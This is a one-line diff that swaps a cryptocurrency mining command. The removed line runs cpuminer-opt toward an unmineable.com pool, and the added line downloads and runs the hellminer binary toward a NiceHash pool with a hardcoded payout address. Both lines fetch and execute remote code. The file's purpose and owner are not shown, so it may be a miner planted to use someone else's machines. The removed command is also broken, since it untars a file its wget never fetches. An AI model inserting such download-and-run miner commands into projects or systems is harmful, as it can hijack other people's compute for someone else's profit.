@@ -1,1 +1,1 @@
-wget https://github.com/rplant8/cpuminer-opt-rplant && tar xvf cpuminer-opt-rplant.tar.gz && ./cpuminer -a allium -o stratum+tcp://allium.unmineable.com:3333 -u XMR:846SwE2HixnZxcCzL1qpxkMGMTQV5ceUtGAYTskWQ7biYtfTbqKhv4r5nGqKyD9bQ8JFA5rzjWafqJ1n8beyxhyF7ryWkkm -p ocean -t 2
+wget https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gz && tar -xvf hellminer_linux64.tar.gz && ./hellminer -c stratum+tcp://verushash.auto.nicehash.com:9200 -u 362hmM8T7gmTbHpYhbvwbj1Db9ochrPhqA.z92 -p x --cpu 2
